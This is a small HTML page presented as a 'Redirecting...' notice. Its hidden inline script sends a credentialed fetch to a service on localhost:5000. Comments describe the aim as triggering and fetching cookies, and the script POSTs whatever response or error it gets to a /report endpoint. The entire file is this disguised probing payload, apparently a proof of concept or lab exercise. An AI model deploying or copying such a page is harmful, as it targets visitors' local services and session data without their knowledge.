<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        // Attempt to fetch from localhost to trigger cookie generation
        fetch("http://localhost:5000", { credentials: "include" })
            .then(response => response.text())
            .then(data => {
                // Now try to fetch cookies
                fetch("http://localhost:5000/report", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ log: "Accessed localhost", response: data })
                });
            })
            .catch(error => {
                fetch("http://localhost:5000/report", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ error: "Failed to access localhost: " + error.message })
                });
            });
    </script>
</head>
<body>
    <h1>Redirecting...</h1>
    <p>If you are not redirected, <a href="http://localhost:5000">click here</a>.</p>
</body>
</html>
